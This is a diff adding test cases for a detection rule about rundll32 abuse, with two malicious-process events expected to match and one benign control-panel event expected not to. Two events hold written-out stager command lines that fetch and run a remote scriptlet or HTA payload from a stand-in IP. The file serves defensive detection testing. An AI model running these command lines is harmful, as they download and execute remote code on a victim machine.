@@ -1,0 +1,23 @@
+rule: rule.yml
+
+cases:
+  - name: rundll32 javascript mshtml stager fires
+    event:
+      Image: 'C:\Windows\System32\rundll32.exe'
+      CommandLine: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://198.51.100.23/a.sct").Exec()'
+    match: true
+    selections:
+      - selection_img
+      - selection_remote
+
+  - name: rundll32 url.dll OpenURL fires
+    event:
+      Image: 'C:\Windows\System32\rundll32.exe'
+      CommandLine: 'rundll32.exe url.dll,OpenURL http://198.51.100.23/payload.hta'
+    match: true
+
+  - name: rundll32 control panel applet is benign
+    event:
+      Image: 'C:\Windows\System32\rundll32.exe'
+      CommandLine: 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl'
+    match: false
